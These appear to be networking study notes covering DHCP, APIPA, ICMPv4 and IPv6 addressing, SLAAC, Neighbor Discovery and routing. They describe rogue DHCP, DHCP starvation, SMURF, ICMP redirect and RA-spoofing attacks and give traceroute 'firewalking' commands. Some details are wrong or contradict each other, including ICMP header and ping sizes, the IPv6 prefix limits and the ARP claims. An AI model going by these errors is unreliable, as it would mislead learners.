![image](https://github.com/user-attachments/assets/cd984d65-0ade-43f1-8504-ba2975676b5b)



## IPv4 Auto Configuration with Vulnerability

```



IPv4 auto-configuration refers to the process by which IPv4 addresses are automatically assigned to devices without manual intervention.

    APIPA

        Automatic Private IP Addressing (APIPA) is the automatic configuration of an ip address to a host machine and selects an address using a pseudo-random number generator with a uniform distribution in the range from 169.254.1.0 to 169.254.254.255.

        The first 256 and last 256 addresses in the 169.254/16 prefix are reserved for future use and MUST NOT be selected by a host using this dynamic configuration mechanism.

        When a host machine is set for Dynamic Host Configuration Protocol (DHCP) and is unable to locate a DHCP server, an APIPA address is given to the machine to allow it to communicate via Link-Local to other machines on the same physical or logical link.

    DHCP

        Dynamic Host Control Protocol (DHCP) when configured on a host machine will send a broadcast DHCPDISCOVER message to and availible DHCP servers.

        DHCP D.O.R.A process

            DHCP D iscover:

                When a device (client) connects to a network and needs to obtain an IP address, it sends out a DHCP Discover message to discover DHCP servers on the network.

                The DHCP Discover message is broadcasted as a DHCP broadcast packet, typically using the destination IP address 255.255.255.255 and the destination MAC address ff:ff:ff:ff:ff:ff.

            DHCP O ffer:

                DHCP servers on the network that receive the DHCP Discover message respond with a DHCP Offer message.

                The DHCP Offer message contains an available IP address and other network configuration parameters (such as subnet mask, default gateway, DNS server addresses) that the DHCP server is offering to the client.

                The DHCP Offer message is typically sent as a unicast packet to the client’s MAC address.

            DHCP R equest:

                Upon receiving one or more DHCP Offer messages, the client selects one DHCP server and sends a DHCP Request message to that server.

                The DHCP Request message includes the IP address offered by the selected DHCP server.

                If the client receives multiple DHCP Offer messages, it may send DHCP Request messages to multiple servers, but it will ultimately accept only one offer.

            DHCP A cknowledge (ACK):

                The DHCP server that receives the DHCP Request message verifies the requested IP address’s availability and reserves it for the client.

                The DHCP server sends a DHCP Acknowledge (ACK) message to the client, confirming the IP address assignment and providing additional configuration parameters.

                The DHCP Acknowledge message is sent as a unicast packet to the client’s MAC address.

Vulnerability:



        These processes do work as long as there are IPs available to be assigned, a legitimate DHCP server available, or trust of others hosts on the Link-Local. The vulnerability in that there is no verification or authorization being performed by default. These default auto configurations could allow an attacker to gain access into your network, assign out false IPs, and/or perform a denial/starvation attack.

        Rougue DHCP servers are very common and easy to setup. A malicious person can setup a Rougue DHCP server to assign addresses for a particular network. In these configurations the attacker can assign whatever they want for the Gateway, DNS suffix and DNS server addresses. A malicious DNS server can result in legitimate Domain names being resolved to IP addresses of fake websites used to steal credentials or deploy malware.

        DHCP Starvation attack. When a malicious user has to compete with the legitimate DHCP server for address assignments, the attacker can flood the DHCP server with several bogus DHCP requests in order to exaust its pool of addresses. Once this is done the rougue DHCP server is the only DHCP server with addresses to assign.

        DHCP Security Considerations RFC2131 Section 7

        Link-Local Security Considerations RFC3927 Section 5




```


## ICMPv4 Protocol
![image](https://github.com/user-attachments/assets/4675efda-c6e2-4f73-be7b-b2bceedde01b)
```


ICMPv4

    ICMP is used to provide feedback about network problems that may or do prevent packet delivery. This protocol was designed to provide error reporting, flow control and first-hop gateway redirection. While IP and UDP are unreliable, it is still important to have a way to notify the sender if something goes wrong in a transmission. TCP is able to realize and react when packets aren’t being delivered, but ICMP provides a method for discovering more serious problems like "TTL exceeded" or "need more fragments."

    Echo Request (Type 8):

        Sent by a device to request an Echo Reply from another device.

        Often used by the "ping" utility to test network connectivity and measure round-trip time.

        Depending on the operating system Echo Requests (PING) can have different packet sizes and default payloads.

            Linux:

                Default size: 64 bytes (16 byte ICMP header + 48 byte payload)

                Payload message: !\”#\$%&\‘()*+,-./01234567

            Windows:

                Default size: 48 bytes (16 byte ICMP header + 32 byte payload)

                Payload message: abcdefghijklmnopqrstuvwabcdefghi

    Echo Reply (Type 0):

        Sent by a device in response to an Echo Request.

        Contains the same payload as the original Echo Request and is used to confirm network connectivity.

    Destination Unreachable (Type 3):

        Destination Network Unreachable (Code 0):

            Indicates that the network hosting the destination address is unreachable.

            This can occur if there is no route to the destination network in the routing table.

        Destination Host Unreachable (Code 1):

            Indicates that the specific destination host is unreachable.

            This can occur if there is no route to the destination host in the routing table or if the destination host is down.

        Destination Protocol Unreachable (Code 2):

            Indicates that the transport protocol specified in the packet’s header is not supported by the destination.

            For example, if a UDP packet is sent to a destination that does not have a process listening on the specified UDP port, this error may be generated.

        Destination Port Unreachable (Code 3):

            Indicates that the specified port on the destination host is unreachable.

            This typically occurs when there is no process listening on the specified port or if a firewall is blocking access to the port.

        Fragmentation Needed and Don’t Fragment was Set (Code 4):

            Indicates that the packet is too large to be transmitted without fragmentation, but the Don’t Fragment (DF) flag is set in the packet’s header.

            This error is generated to inform the sender that the packet needs to be fragmented to be transmitted successfully.

        Source Route Failed (Code 5):

            Indicates that the source route specified in the packet’s header is invalid.

            Source routing allows the sender to specify the route that the packet should take through the network, but if the specified route is invalid, this error may be generated.

        Destination Network Unknown (Code 6):

            Indicates that the destination network is unknown.

            This error typically occurs when the destination network is not listed in the routing table.

        Destination Host Unknown (Code 7):

            Indicates that the destination host is unknown.

            This error typically occurs when the destination IP address is not reachable or is not assigned to any host.

        Source Host Isolated (Code 8):

            Indicates that communication with the source host is administratively prohibited.

            This error is generated by a router or firewall to indicate that the source host is isolated or not allowed to communicate with the destination.

        Communication with Destination Network Administratively Prohibited (Code 9):

            Indicates that communication with the destination network is administratively prohibited.

            This error typically occurs when access to the destination network is restricted by network policies or firewall rules.

        Communication with Destination Host Administratively Prohibited (Code 10):

            Indicates that communication with the destination host is administratively prohibited.

            This error typically occurs when access to the destination host is restricted by network policies or firewall rules.

        Network Unreachable for Type of Service (Code 11):

            Indicates that the network is unreachable for the specified type of service.

            This typically occurs when the network does not support the requested type of service or quality of service.

        Host Unreachable for Type of Service (Code 12):

            Indicates that the destination host is unreachable for the specified type of service.

            This typically occurs when the destination host does not support the requested type of service or quality of service.

        Communication Administratively Prohibited (Code 13):

            Indicates that communication with the destination is administratively prohibited.

            This can occur due to network policies or firewall rules that explicitly block communication with the destination.

    Redirect (Type 5):

        Used by routers to inform hosts of a better route to a particular destination.

        Informs the host to update its routing table with the new route information.

            Redirect Datagram for the Network (Code 0): This code indicates that the router has a better route to the destination network and is redirecting the packet to the sender’s specified gateway. It instructs the sender to update its routing table with the new gateway information.

            Redirect Datagram for the Host (Code 1): This code indicates that the router has a better route to the destination host and is redirecting the packet to the sender’s specified gateway. It instructs the sender to update its routing table with the new gateway information.

            Redirect Datagram for the Type of Service and Network (Code 2): This code is similar to Code 0 but also includes a Type of Service (ToS) component. It indicates that the router has a better route to the destination network with a specific Type of Service and is redirecting the packet accordingly.

            Redirect Datagram for the Type of Service and Host (Code 3): This code is similar to Code 1 but also includes a Type of Service (ToS) component. It indicates that the router has a better route to the destination host with a specific Type of Service and is redirecting the packet accordingly.

    Time Exceeded (Type 11):

        Indicates that a packet’s Time-to-Live (TTL) value has reached zero or that the packet’s hop limit has been exceeded.

        Subtypes of Time Exceeded include:

            Time to Live Exceeded in Transit (Code 0): Indicates that the TTL of the packet expired while in transit.

            Fragment Reassembly Time Exceeded (Code 1): Indicates that the time allowed for reassembly of fragments has expired.

    Timestamp Request (Type 13):

        Sent by a device to request a Timestamp Reply from another device.

        Used to measure round-trip time and clock synchronization between devices.

    Timestamp Reply (Type 14):

        Sent by a device in response to a Timestamp Request.

        Contains timestamps indicating the time the request was received and the time the reply was sent.




```

## ICMPv4 OS Fingerprinting
```
Linux
64 bytes
Payload Message 0123456abcdefg

Windows
40 bytes
abcdefghijklmnopqrstuvwxyz

```

## Common ICMP attacks


Fire-walking - Using traceroute and TTLs to map out a network. Using traceroute with TCP and UDP protocols an attacker could map the open ports on a firewall.

DEMO Firewalking

When performing traceroute. Linux will use UDP as its default. Windows will use ICMP Echo Requests as its default. Linux will require sudo when specifying any traceroute other than the default.
```
            traceroute 8.8.8.8
```
Using traceroute with TCP. This will use TCP port 80 as the default.
```
            sudo traceroute 8.8.8.8 -T
```
Using traceroute with TCP and a different port.
```
            sudo traceroute 8.8.8.8 -T -p 443
```
Using traceroute with UDP and a different port.
```
            sudo traceroute 8.8.8.8 -U -p 123
```
Using traceroute with ICMP (Windows Default)
```
            sudo traceroute 8.8.8.8 -I
```
Over-sized ICMP informational messages - These over-sized ICMP packets can cause a system to crash. Typically packets should not be greater than 65,535 bytes in size and anything greater would violate RFC 791. Systems would not know how to process these packets and most likely would crash. The Ping-of-Death is one example of this. Attackers could use tools like hping2 to craft these packets.

ICMP redirects: - Routers use ICMP redirect messages to inform hosts that a better route is available for a particular destination is available through another router on the same network. Hosts can only be assigned one IP address as its default gateway but the network could have more than one router to lead to remote networks. If the default gateway receives a packet on an interface, and through its routing table lookup it determines that the next hop router towards that network is out the same interface that the packet was received, it will forward the packet to the next hop and send the ICMP redirect message back to the host. The host will update its internal routing tables for that specific destination address.

An attacker can use ICMP redirects to perform a Layer 3 man-in-the-middle attack. If the attacker can intercept a message they can send an ICMP redirect back to the victim to tell it to route traffic through the attacker rather than the router.

Note: ICMP redirects are disabled by default if Hot Standby Router Protocol (HSRP) is configured on the interface.

SMURF Attack: - SMURF attack is a form of amplification attack where an attacker can send very few packets and it will generate a lot of packets. The attack works by sending an ICMP echo request (PING) using a spoofed source address to a directed broadcast address of a network. This PING will reach all hosts on the network who will then respond to the spoofed IP address. All the hosts responding will create a lot of traffic and overload the victim’s device causing a DoS.

IP unreachable messages to map a network - By default, routers will send an ICMP unreachable message back to the source if it drops a packet for whatever reason. This action can be used by attackers to map out the network topology.

ICMP Covert Channel - Many networks allow ICMP traffic in and out of their networks. Malicious actors can disguise communication channels as ICMP traffic. This traffic will have typical ICMP headers but the payload will greatly vary depending on the type of traffic encapsulated.


## ICMPv4 Traceroute
Windows ICMP


Lunix does not

traceroute -U 17.16.82.106

sudo traceroute -T 172.16.82.106 -p 443


## IPv6 Addressing 




    IPv6 (Internet Protocol version 6) is the most recent version of the Internet Protocol, designed to succeed IPv4. IPv6 addresses are used to uniquely identify and locate devices on a network. IPv6 was introduced to address the limitations of IPv4, primarily the exhaustion of available IPv4 addresses due to the rapid growth of the internet.

    IPv6 addresses are 128 bits long, compared to the 32-bit addresses used in IPv4. This significantly expands the address space, allowing for a virtually unlimited number of unique addresses. The IPv6 address format is expressed as eight groups of four hexadecimal digits, separated by colons.

        Hexadecimal Representation: IPv6 uses hexadecimal digits (0-9 and A-F) in groups of four, separated by colons. These groupings of 4 HEX are called "Hextets". This representation makes IPv6 addresses more concise than the dotted-decimal format used in IPv4.

        Expanded Address Space: With 128 bits, IPv6 provides an enormous address space compared to the 32-bit address space of IPv4. The number of unique IPv6 addresses is approximately 2128, allowing for an abundance of unique addresses.

            The 128-bit space if split into 2 64-bit parts called the Prefix and Interface ID.

            In theory this grants the ability to create 264 of prefixs (Networks) with 264 of interface IDs (hosts) per network.

        IPv6 Address Types: IPv6 defines different types of addresses, including unicast, multicast, and anycast addresses. Unicast addresses identify a single interface, multicast addresses represent a group of interfaces, and anycast addresses identify the nearest among a group of interfaces.

        Global Unicast Addresses: Similar to public IPv4 addresses, global unicast IPv6 addresses are routable on the internet. They are assigned by Internet Assigned Numbers Authority (IANA) to Regional Internet Registries (RIRs), which then allocate them to Internet Service Providers (ISPs) and organizations.

        Link-Local Addresses: Link-local addresses are used for communication on a single network segment (link). They are automatically configured by devices when no DHCP server is available, and they are not routable beyond the local network.

        Unique Local Addresses: Unique local addresses are similar to IPv4 private addresses and are used for local communication within an organization. They are not routable on the global internet.

        IPv6 Prefix Notation: IPv6 addresses often use a prefix notation to specify the network portion. For example, in the address 2001:0db8:85a3:0000:0000:8a2e:0370:7334, the prefix is 2001:0db8:85a3::/48, indicating the network portion.


## IPv6 Addressing and Subnetting 
    Pv6 addressing

        In 2011 IPv6 was released to use world wide. IPv6 was released to eventually replace IPv4 because of IPv4’s lack of address space. Along with IPv6’s release the packet design was simplified from the IPv4 15 sections header IPv6 holds only 8 sections with less wasted fields.

        IPv6 addresses are 128 bits in length and will support up to 340 undecillian addresses.

            64-bit Prefix (4 hextets) - Generally this is the network portion of the address.

                Organizations asigned a 48-bit Prefix by IANA.

                Last 16-bits of prefix is used for subnetting (allows upto 65,536 subnets).

            64-bit Interface ID (4 hextets) - Generally this is the host portion of the address.

                Allows for 264 hosts or 18,446,744,073,709,551,616 (eighteen quintillion, four hundred forty-six quadrillion, seven hundred forty-four trillion, seventy-three billion, seven hundred nine million, five hundred fifty-one thousand, six hundred sixteen).

        IPv6 addresses are typically represented as eight groups of hexadecimal digits separated by colons, such as 2001:0db8:85a3:0000:0000:8a2e:0370:7334.

        Leading zeros within each group can be omitted, and consecutive groups of zeros can be abbreviated with a double colon (::), but the double colon can only be used once in an address to avoid ambiguity.

    Obstacles to transition:

        Compatibility and Interoperability: During the transition period, both IPv4 and IPv6 networks need to coexist, requiring mechanisms for compatibility and interoperability. Dual-stack configurations, transition technologies, and network address translation (NAT) mechanisms are used to facilitate communication between IPv4 and IPv6 networks.

        Legacy Infrastructure: Many existing networks, devices, and applications are built on IPv4 and may require significant updates or replacements to support IPv6. Legacy infrastructure poses a significant obstacle to IPv6 migration, especially for organizations with large and complex networks.

        Cost and Investment: Transitioning to IPv6 often requires significant investments in equipment, software, training, and operational changes. For organizations with limited resources or competing priorities, the cost of migration can be a barrier.

        Security Concerns: IPv6 introduces new security considerations and challenges, including the need for updated security policies, mechanisms, and tools. Organizations may be hesitant to adopt IPv6 due to concerns about potential security vulnerabilities and risks. Complexity of Deployment: Deploying IPv6 in large-scale networks or complex environments can be challenging due to the need for careful planning, coordination, and testing. Organizations may encounter technical issues, configuration errors, or unforeseen challenges during deployment.

        Resistance to Change: Resistance to change or inertia within organizations can impede IPv6 adoption, especially in environments where IPv4 has been the standard for many years. Overcoming organizational resistance and fostering a culture of innovation and adaptation are essential for successful IPv6 migration.

        IPv6 adoption chart from Google

    IPv6 Subnetting


![image](https://github.com/user-attachments/assets/017db043-fa9a-4852-9db4-98d4babfb8ee)

## IPv6 Header
![image](https://github.com/user-attachments/assets/99b6b872-891a-42d9-919c-3d29ea90bdde)
![image](https://github.com/user-attachments/assets/ec891f00-9809-419e-aaa2-ddf7bcf43d17)
```


Version (4 bits): Indicates the version of the Internet Protocol being used. For IPv6, this field is set to 6.

Traffic Class (8 bits): Combines the functions of the IPv4 Type of Service (ToS) and Differentiated Services Code Point (DSCP) fields.

    Used for quality of service (QoS) and packet prioritization.

Flow Label (20 bits): Used to label packets belonging to the same flow, allowing routers to apply specialized handling to those packets.

    It allows routers and network devices to identify packets belonging to the same flow or traffic stream and apply consistent treatment, such as prioritization or routing policies.

Payload Length (16 bits): Specifies the length of the IPv6 payload, including any extension headers, in octets (8-bit units).

Next Header (8 bits): Indicates the type of the next header following the IPv6 header.

    Comparable to the protocol field in the IPv4 header with alot of the same values.

    If the value corresponds to an IPv6 extension header, the processing of the packet continues with the specified extension header.

    If the value corresponds to an upper-layer protocol (such as TCP or UDP), the packet payload is handed over to that protocol for further processing.

        TCP: 6

        UDP: 17

        ICMPv6: 58

        EIGRP: 88

        OSPF: 89

Hop Limit (8 bits): Similar to the Time-to-Live (TTL) field in IPv4, specifies the maximum number of hops (routers) the packet can traverse before being discarded.

    This field is comparable to the TTL field in the IPv4 Header.

    Decremented by one by each router that forwards the packet.

Source Address (128 bits): Specifies the IPv6 address of the packet’s source.

    Address is expressed in HEX.

    Examples:

        fe80:0000:0000:0000:0000:0000:0000:1

        2001:0db8:85a3:0000:0000:8a2e:0370:7334

Destination Address (128 bits): Specifies the IPv6 address of the packet’s intended destination.

    Address is expressed in HEX.

    Examples:

        fd00:1234:5678:9abc:0000:0000:0000:1

        ff02:0000:0000:0000:0000:0000:0000:1

        2001:0db8:85a3:0000:0000:8a2e:0370:7334 
```

## Decoding IPv6 Packet
```
38 c9 86 2d 92 61 00 e0　4c 36 1c 43 86 dd 60 04
82 45 00 10 3a 40 20 01　0d b8 00 01 00 00 00 00
00 00 00 00 00 01 20 01　0d b8 00 02 00 00 00 00
00 00 00 00 00 02 80 00　31 e7 21 c1 00 07 5c 98
25 e4 00 02 4e 0f
```


```


38 c9 86 2d 92 61 is the destination MAC address

00 e0 4c 36 1c 43 is the source MAC address

86 dd is the Ethertype for IPv6

60 04 82 45 is the Version, Traffic Class, and Flow Label fields.

    6 is to identify the version is 6.

    0 0 is the Traffic class. Similar to the DSCP field in IPv4.

    4 82 45 is the Flow Label field. Used by IPv6 to tell routers to route all packets together.

00 10 is the Payload Length field. Does not measure the header size as it is always 40 bytes. Currently set to 16 bytes.

3a is the Next Header field. Currently set to identify ICMPv6.

    06 is for TCP

    11 is for UDP

40 is the Hop Limit field. Currently set to 64.

20 01　0d b8 00 01 00 00 00 00 00 00 00 00 00 01 is the source IP address. Currently set to 2001:db8:1::1.

20 01　0d b8 00 02 00 00 00 00 00 00 00 00 00 02 is the destination IP address. Currently set to 2001:db8:1::2.

The remaining will be the payload.

```

![image](https://github.com/user-attachments/assets/d0e07e29-9f5c-4605-a870-a941ffe5a69c)



## Differences Between v4 and v6

![image](https://github.com/user-attachments/assets/ab6bb520-a14d-4387-9358-d4059d5b7467)



    Some fields were kept the same (version, source, and destination address fields).

        Version 4 or 6

        IPv4 addresses are 32-bits in length

        IPv6 addresses are 128-bits in length

    Other fields perform the same function but have different names

        TTL → Hop count

        Protocol → Next header

        Type of Service (TOS) (otherwise known as DSCP/ECN) → Traffic class.

    IPv6 does have one new field defined by RFC6437. The flow label field enhances the traffic class field by allowing the association of traffic belonging to the same "flow" or "conversation". Additionally, extension headers defined in RFC2460 Section 4 are supported to enhance the functionality of the IPv6 header for specific functions.

    IPv6 does not have an IHL field. This is because it has a static length of 40 bytes whereas IPv4 has a variable length header from 20 bytes (IHL=5) to 60 bytes (IHL=F).

    IPv4 supports options that are appended to the header in 4-byte increments. Up to 40 bytes of options can be used. IPv6 does not use options but does support Extension Headers. Extension headers are not appended to the IPv6 header but rather are extra headers that follow the IPv6 header before the actual data.


# IPv6
## IPv6 Representation



    There are 128 bits in an IPv6 address that are divided into eight 16 bit groupings separated by colons (:). In IPv6 the term for a 16 bit grouping are called a hextet. Within each hextet the 16 bits are represented by 4 hex digits. When displaying the IPv6 address, leading zeros can be dropped. This same thing is done with IPv4.

    When looking at an IPv4 addresses you can not diffrentiate the network portion or the host portion without pairing it with it’s subnet mask.

        100.10.10.10 for example is a unique address. But looking at it we do not know the actual network/subnet it resides on.

            100.10.10.10 /8 would mean that the first 8 bits are "network bits" and the remaining 24 bits are "host bits". This would put the host on the 100.0.0.0 /8 network.

            100.10.10.10 /16 would mean that the first 16 bits are "network bits" and the remaining 16 bits are "host bits". This would put the host on the 100.10.0.0 /16 network.

            100.10.10.10 /24 would mean that the first 24 bits are "network bits" and the remaining 8 bits are "host bits". This would put the host on the 100.10.10.0 /24 network.

    IPv6 addresses are inheriently split into 2 main parts.

        The first 64 bits (or "Prefix") is used to represent the network portion.

        The remaining 64 bits (or "Interface ID") is used to represent the host portion.

    IPv6 CIDR expresses the number of bits in the network portion of the address. In the case of IPv6 addresses this can be up to /64 and not more. The exception to this rule is when using the /128 CIDR which is used to express the host IP address such as ::1/128 or 2001:ABCD:1234:DEF0:1111:2222:3333:4444 /128

    IPv6 addresses can be very long. A method to help shorten the address is by dropping any leading zeros "0’s"

        :0001: can be shortened to :1:

        A series of 0’s can be shortened by replacing it with ::.

            FE80:0000:0000:0000:0000:0000:0000:0001 can be simply expressed as FE80::1

        When 2 or more consecutive 0’s are present, only one can be shortened with the ::. It is the user’s choice which.

            FE80:0000:0000:0000:abcd:0000:0000:0001 can be shortned to FE80::abcd:0:0:1 or FE80:0:0:0:abcd::1.

            The "::" notation can only be used once within an IPv6 address to avoid ambiguity. If it were allowed to appear multiple times in an address, it would be challenging to determine how many groups of zeros should be compressed at each occurrence.

![image](https://github.com/user-attachments/assets/507384e0-8ebd-4d98-b95f-4d044c73c6c3)




## IPv6 Address Types and Scopes



    IPv6 address types:

        Unicast Addresses IPs are a "one to one" communication between two nodes.

            These are similar in function to that of IPv4 unicast addresses.

        Multicast Addresses Used for one to many communications and routing protocols.

            These perform the same function as the Class D or multicast addresses of IPv4.

            Range ff00::/8 - ff00:: thru ffff::

        Anycast Addresses These addresses can fall within the Global, Unique-Local, or Link-Local address scopes. They differ from unicast in that more than one device can be configured with the same address. These are typically used to address several network gateways. Each gateway can be configured with the same anycast address. Any of these devices can supply the service request for the client. These can also be used for servers when trying to load balance a particular service.


    IPv6 address scope:

        Loopback Address IPv6 address used by a node on a vitural interface to send packets to itself. This is the same as the 127.0.0.1 is for IPv4.

            Scope is ::1/128

        Global Unicast Addresses IPv6 addressess that are routable over the Internet.

            Scope is 2000::/3 - 2000:: thru 3fff::

                2001:0000:/32 - reserved for Teredo tunneling

                2001:20::/28 - reserved for ORCHIDv2

                2002::/16 - reserved for 6to4 tunneling

        Unique-Local Addresses IPv6 addresses the are routable locally within a site, not globally routable across the Internet. These perform a similar function as the RFC 1918 private IPv4 addresses and will require NAT to translate the address to a Global Unicast address for communication over the Internet.

            Scope is fc00::/7 - fc00:: thru fdff::

        Multicast addresses

            Scope ff00::/8 - ff00:: thru ffff::

                ffx0::/8 - reserved

                ffx1::/8 - interface-local - spans only a single interface on a host. Used for loopback multicast.

                ffx2::/8 - link-local - spans the local network. Does not traverse network bounderies. Comparable to 224.0.0.0/24 for IPv4.

                ffx3::/8 - realm-local - spans farther than link-local but under determination of the administrator. Should not bound farther than those below.

                ffx4::/8 - admin-local - smallest scope that can be administratively configured.

                ffx5::/8 - site-local - spans a single site of an organization.

                ffx8::/8 - organization-local - spans to all sites in a single organization.

                ffxe::/8 - global - spans all hosts on the internet and is unbounded.

                ffxf::/8 - reserved

        Link-Local Addresses IPv6 addresses that are assigned to a IPv6 enabled interface for direct link on link communcations. Automatic link-local assignment is done if a one is not manually assigned. Each IPv6 enabled device must have a link-local address defined for local communicaiton. These can not be used as routable addresses.

## IPv6 Auto Configuration and Vilnerability


Stateless Address Autoconfiguration (SLAAC)(default):

SLAAC is the primary method of IPv6 address autoconfiguration and is similar to IPv4 DHCP in some respects but simpler.

In SLAAC, routers on the local network periodically multicast Router Advertisement (RA) messages (FF02::1) to announce their presence and provide network configuration information.

Hosts on the network receive these RA messages and use the information contained within them to configure their IPv6 addresses and other parameters.

Hosts can also send Router Solicitation (RS) message (FF02::2) to request network information. This is commonly done when a host first powers on. The router will respond with a RA message to the host sent using FF02::1.

Each host uses its unique identifier (based on the MAC address or another mechanism) and the network prefix advertised in the RA messages to generate its IPv6 address.



Stateful/Stateless Address Autoconfiguration (DHCPv6):

DHCPv6 is an extension of the DHCP protocol used in IPv4 networks, and it provides additional configuration options beyond basic address assignment.

With DHCPv6, hosts can obtain IPv6 addresses, DNS server information, and other network configuration parameters from a DHCPv6 server.

DHCPv6 can be used in conjunction with SLAAC, allowing hosts to obtain additional configuration options from DHCPv6 while still using SLAAC for address assignment.







IPv6 zero configuration

    When a node has IPv6 enabled on it’s interface it is setup with an automatic assigning of link-local addresses that will work with zero configuration in the range of fe80::/10. Upon powering on, an IPv6 device will configured its own Link-Local address in the range of FE80::/10.

    If configured for DHCPv6 it will perfom a process called Stateless Address Autoconfiguration (SLAAC) as defined in RFC 4862, Neighbor Discovery Protocol (NDP) using ICMPv6. The host will send a Router Solicitation (RS) message to the multicast address of FF02::2 (all routers). This message is intended to reach any IPv6 configured routers on the same network link as itself. The router will respond with a Router Advertisement (RA) message sent to the requesting node at its solicited node multicast address of FF02::1:FFxx:xxxx (xx:xxxx is the last 24 bits of the requestors interface ID). The RA is also sent to the multicast address of FF02::1 (all nodes) at regular intervals. In the message it will include:

        IPv6 Global routing prefix (first 64 bits)

        Prefix length (up to a /64)

        Gateway address (the router’s IP address)

        Other additional options such as instructions to get further information from DHCPv6

    The host will initiate the process to generate its own interface ID (last 64 bits). It will use either:

        EUI-64 - The host will use its 48-bit MAC address and insert "FFFE" between the 3 Byte OUI and 3 Byte Vendor assigned ID. This insertion of 16-bits will make the full 64-bit Interface ID. It will then "flip" the 7th bit of the interface ID. Changing that bit from a 0 to a 1 or 1 to a 0.

            Typically *Nix systems and Cisco devices use EUI-64 by default.

            Windows devices use Random Generation by default, but can be configured to use EUI-64.

            a MAC address of fa:16:3e:c3:68:f2 will resolve an EUI-64 address of FE80::f816:3e ff:fe c3:68f2.

            There are security concerns of EUI-64 in being able to reverse engineer it to a specific host MAC address.

            Example 1 (Link-Local):

                MAC: fa:16:3e:c3:68:f2

                Append: ff:fe between OUI and Vendor assigned

                Flip 7th bit

                Result: FE80::f816:3eff:fec3:68f2

            Example 2 (Global):

                Prefix from RA: 2001:ABCD:1234:DEF0::

                MAC: fa:16:3e:c3:68:f2

                Append: ff:fe between OUI and Vendor assigned

                Flip 7th bit

                Result: 2001:ABCD:1234:DEF0:f816:3eff:fec3:68f2

        Random generation - Random generation was developed to generate the interface ID using psudo random generation to avoid device fingerprinting.

            Windows Vista and up use this process by default.

            Can not be reversed to a MAC address but knowing that Windows using this method by default can be an indicator.

            Examples:

                Prefix from RA: 2001:ABCD:1234:DEF0::

                Link-Local: FE80::cdc3:b3ac:1623:f552

                Global: 2001:ABCD:1234:DEF0:182f:dd86:f2be:653b



## MITM With SLAAC

Man-in-th-Middle (MitM) attack with SLAAC - It is possible for a malicious actor to take advantage of SLAAC to create a MitM attack by impersonating a IPv6 router. IPv6 is not able to leverage ARP in order to perform MAC to IP resolutions for the local network. IPv6 utilizes a sub-set of the ICMPv6 protocol called "Neighbor Solicitation (NS)". One particular NS message called Router Advertisements (RA) messages are normally sent by routers to advertise the local network IPv6 Prefix. In addition to the prefix, these messages advertise the MAC address of the router. The hosts will accept this mesages and append their Interface-Id to generate their 128-bit IPv6 address for remote communication. If a malicious actor has percistance on the network they can send crafted RA messages for IPv6 clients to accept. By accepting these RA messages the hosts will record and save the sending MAC address as its "gateway" in the arp-cache.

## Vulnerabilities

Fingerprint

ROUGUE DHCP

Evil Twin

DHCP Starvation





## ICMPv6 


    This protocol includes all the same functionality as ICMPv4 with some added features like Fragmentation, Neighbor Discovery, and StateLess Address AutoConfiguration (SLAAC). Another change between ICMPv6 and ICMPv4 is that version 6 allows multicast transmission not just unicast transmission.


ICMPv6 Ping Request
![image](https://github.com/user-attachments/assets/4f07ce40-c07c-4ce0-b82e-c420a15f4a22)


    The first image shows that the PC is performing a ping request to a network address of 2a01:2e0:3fe:1001:302::


ICMPv6 Neighbor Solicitation
![image](https://github.com/user-attachments/assets/68b96df6-25ba-46b7-bf43-d97593a83b33)


    The second image shows after the router received the ping request, it sends out a Neighbor Solicitation (ICMPv6 Type 135) to the Solicited-Node multicast address, in this case ff02::1:ff2d:3b8e. The Solicited-Node address was derived by the least-significant 24 bits of the unicast address (2d:3b8e) and appending them to the prefix ff02::1:ff/104. The router’s source IPv6 is using its manual assigned Link-Local address (fe80::1). This Neighbor Solicitation process is similar to the IPv4 ARP request.


ICMPv6 Neighbor Advertisement
![image](https://github.com/user-attachments/assets/e68347d5-5cc5-426a-9e9f-c5c68b1205bd)


    The third image shows the PC’s response, a Neighbor Advertisement (ICMPv6 Type 136), to the router’s Neighbor Solicitation. The PC’s IPv6 address is 2003:50:aa10:4243:221:6aff:fe2d:3b8e and the destination is back to the router’s Link-Local address (fe80::1). This Neighbor Advertisement process is similar to the IPv4 ARP reply.


ICMPv6 Ping Reply
![image](https://github.com/user-attachments/assets/a690d0da-124c-49f7-a32c-e630d344e45d)


    The last image shows the router’s ping reply to the PC.


## Neighbor Discovery Protocol



    Router Solicitation (Type 133)

        Hosts inquire with Router Solicitation messages to locate routers on an attached link. Routers which forward packets not addressed to them generate Router Advertisements immediately upon receipt of this message rather than at their next scheduled time.

        Sent using the multicast address of FF02::2 (all routers) group.

    Router Advertisement (Type 134)

        Routers advertise their presence together with various link and Internet parameters either periodically, or in response to a Router Solicitation message.

        Sent using the multicast of FF02::1 (all nodes) group.

    Neighbor Solicitation (Type 135)

        Neighbor solicitations are used by nodes to determine the link layer address of a neighbor, or to verify that a neighbor is still reachable via a cached link layer address.

        Similar to an ARP Request when using IPv4. IPv6 does not use ARP however. It uses Neighbor Solicitation to request the MAC address of the destination.

        Duplicate Address Detection (DAD). Sent by host to the IPv6 address it intends to use. This is to determine if the address is already in use.

    Neighbor Advertisement (Type 136)

        Neighbor advertisements are used by nodes to respond to a Neighbor Solicitation message.

        Similar to an ARP Reply when using IPv4. IPv6 does not use ARP however. It uses Neighbor Advertisement to respond to a Neighbor Solicitation.

    Redirect (Type 137)

        Routers may inform hosts of a better first hop router for a destination.


# Analysing Internet Routing 


Internetworking is the ability of network to communicate with other networks via intermediate networking devices (routers, switches) and links (ethernet, fiber). IP, a layer 3 protocol, uses logical addresses. These logical addresses are used to determine how a packet gets forwarded from one network to another. To allow network-to-network communication a global addressing scheme is required so that each host can be uniquely distinguished. Every network is assigned a unique value (network ID) and all the hosts on that network share the same network ID but each has their own host ID. The combination of the network ID and host ID makes each address unique.


Routers, also called Gateways, are layer 3 devices that make their forwarding decisions based on the layer 3 logical address. When a router receives a packet, the packet is decapsulated to read the destination IP address. The router then will make a routing decision based on the routing table, encapsulate the packet with new layer 2 information and then forward it out a interface.

![image](https://github.com/user-attachments/assets/b5a3c2b9-5ad0-43eb-877a-33c34223567d)


## Routing Tables

![image](https://github.com/user-attachments/assets/88564ce0-3d11-4157-b4a1-2257c2088880)



Ultimate route is any routing table entry that has a next-hop IPv4 address, exit interface, or both.

Level 1 route is any route with the subnet mask (CIDR) is equal to or less than the classful mask of the network address. A level 1 route can be a:

Network route - A network route that has a subnet mask equal to that of the classful mask.

            Class A - 255.0.0.0 (/8)

            Class B - 255.255.0.0 (/16)

            Class C - 255.255.255.0 (/24)

Supernet route - A network route with a mask less (smaller) than the classful mask.

